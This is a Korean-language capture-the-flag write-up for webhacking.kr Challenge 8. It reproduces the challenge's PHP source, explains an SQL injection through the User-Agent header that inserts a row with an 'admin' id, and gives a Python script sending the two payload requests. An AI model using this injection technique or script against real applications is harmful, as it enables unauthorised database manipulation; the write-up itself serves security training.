# Write-Up
## 취약점 확인
index.phps 를 읽어보면 다음과 같은 소스가 있습니다.

```
<html>
<head>
<title>Challenge 8</title>
<style type="text/css">
body { background:black; color:white; font-size:10pt; }
</style>
</head>
<body>
<br><br>
<center>USER-AGENT

<?

$agent=getenv("HTTP_USER_AGENT");
$ip=$_SERVER[REMOTE_ADDR];

$agent=trim($agent);

$agent=str_replace(".","_",$agent);
$agent=str_replace("/","_",$agent);

$pat="/\/|\*|union|char|ascii|select|out|infor|schema|columns|sub|-|\+|\||!|update|del|drop|from|where|order|by|asc|desc|lv|board|\([0-9]|sys|pass|\.|like|and|\'\'|sub/";

$agent=strtolower($agent);

if(preg_match($pat,$agent)) exit("Access Denied!");

$_SERVER[HTTP_USER_AGENT]=str_replace("'","",$_SERVER[HTTP_USER_AGENT]);
$_SERVER[HTTP_USER_AGENT]=str_replace("\"","",$_SERVER[HTTP_USER_AGENT]);

$count_ck=@mysql_fetch_array(mysql_query("select count(id) from lv0"));
if($count_ck[0]>=70) { @mysql_query("delete from lv0"); }


$q=@mysql_query("select id from lv0 where agent='$_SERVER[HTTP_USER_AGENT]'");

$ck=@mysql_fetch_array($q);

if($ck)
{ 
echo("hi <b>$ck[0]</b><p>");
if($ck[0]=="admin")

{
@solve();
@mysql_query("delete from lv0");
}


}

if(!$ck)
{
$q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");
echo("<br><br>done!  ($count_ck[0]/70)");
}


?>

<!--

index.phps

-->

</body>
</html>
```

`$q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");
echo("<br><br>done!  ($count_ck[0]/70)");`

위의 코드에서 취약점이 발생합니다.


User-Agent 값으로 쿼리문을 전송을 하니, User-Agent 를 이용하여서 인젝션을 해주면 될 것 같습니다.

## 풀이
```
$q=@mysql_query("select id from lv0 where agent='$_SERVER[HTTP_USER_AGENT]'");

$ck=@mysql_fetch_array($q);

if($ck)
{ 
echo("hi <b>$ck[0]</b><p>");
if($ck[0]=="admin")

{
@solve();
@mysql_query("delete from lv0");
}


...(생략)


if(!$ck)
{
$q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");
echo("<br><br>done!  ($count_ck[0]/70)");
}
```


여기서 위에 코드를 보면 id 가 admin 이여야 조건이 참이되기 때문에 이에 유의해서 쿼리문을 짜면 다음과 같이 나옵니다.


1. `test', '123', 'admin'), ('test2`
2. `test`


1번 쿼리는 admin 을 체크하는 조건문에서 맞지 않으므로 건너뛰고
insert into 문을 실행하여 다음과 같이 쿼리가 들어가게 됩니다.


`insert into lv0(agent,ip,id) values('test','123','admin'), ('test2', 'ip', 'guest')`


그러면 위와 같은 쿼리문이 실행되어
각 agent, ip, id 컬럼에는 (test, 123, admin) 와 (test2, ip, guest) 2개가 들어가게 됩니다.

그리고 다시 user-agent 에 2번 쿼리를 넣어서 보내면 다음과 같이 쿼리가 실행됩니다.

`select id from lv0 where agent='test'`

그럼 test의 id값이 admin 이였으니 그 값을 리턴하게 되고 참이되어
문제가 해결됩니다.


## Solve.py Source Code
```
import requests

url = "http://webhacking.kr/challenge/web/web-08/index.php"

headers = {
	"user-agent":"test', '123', 'admin'), ('test2",
    "cookie":"PHPSESSID=1f119738c8025cf9fd0d13a3c8436b3c"
}

req = requests.get(url, headers=headers)
print req.text

headers = {
	"user-agent":"test",
    "cookie":"PHPSESSID=1f119738c8025cf9fd0d13a3c8436b3c"
}

req = requests.get(url, headers=headers)
print req.text
```
